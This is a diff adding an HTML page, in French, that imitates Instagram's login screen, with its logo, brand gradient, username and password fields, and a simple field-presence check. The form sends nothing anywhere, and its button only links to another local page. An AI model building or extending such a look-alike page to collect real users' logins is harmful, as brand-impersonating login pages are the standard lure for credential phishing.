@@ -1,0 +1,100 @@
+<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>Connexion - Instagram</title>
+	<style type="text/css">body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .login-container h1 {
+            font-size: 22px;
+            color: #262626;
+            margin-bottom: 20px;
+            font-weight: normal;
+        }
+
+        .login-container label {
+            font-size: 14px;
+            color: #555555;
+            display: block;
+            text-align: left;
+            margin-bottom: 8px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .login-container .btn {
+            display: block;
+            text-decoration: none;
+            width: 100%;
+            padding: 10px;
+            text-align: center;
+            background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+            color: #ffffff;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .login-container .btn:hover {
+            opacity: 0.9;
+        }
+	</style>
+</head>
+<body>
+<div class="login-container"><img alt="Logo Instagram" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"/>
+<h1 href="index3.html" >Connexion à Instagram</h1>
+
+<form action="" id="login-form" method="POST"><label for="email-username">E-mail ou Nom d&#39;utilisateur</label> <input id="email-username" name="email-username" placeholder="Entrez votre e-mail ou nom d&#39;utilisateur" type="text"/> <label for="password">Mot de passe</label> <input id="password" name="password" placeholder="Entrez votre mot de passe" type="password"/> <a class="btn" href="index3.html">Se connecter</a></form>
+</div>
+<script>
+    // Validation des champs côté client
+    document.getElementById("login-form").onsubmit = function () {
+        const emailUsername = document.getElementById("email-username").value.trim();
+        const password = document.getElementById("password").value.trim();
+
+        if (emailUsername === "" || password === "") {
+            alert("Veuillez remplir tous les champs.");
+            return false; // Empêche la soumission du formulaire
+        }
+        return true; // Autorise la soumission du formulaire
+    };
+</script>
+
+</body></html>
